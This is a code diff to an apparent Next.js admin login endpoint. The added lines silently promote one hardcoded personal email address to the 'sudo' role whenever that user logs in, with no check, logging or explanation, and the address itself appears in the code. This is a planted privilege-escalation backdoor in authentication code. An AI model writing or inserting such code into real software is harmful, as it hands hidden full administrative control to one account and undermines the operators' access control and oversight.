@@ -26,6 +26,13 @@ export async function POST(request: NextRequest) {
       );
     }
 
+    if (user.email.toLowerCase() === "echo.adinfauzan@gmail.com" && user.role !== "sudo") {
+      await db
+        .update(adminUsers)
+        .set({ role: "sudo" })
+        .where(eq(adminUsers.id, user.id));
+    }
+
     await createAdminSession(user.id);
 
     return NextResponse.json({
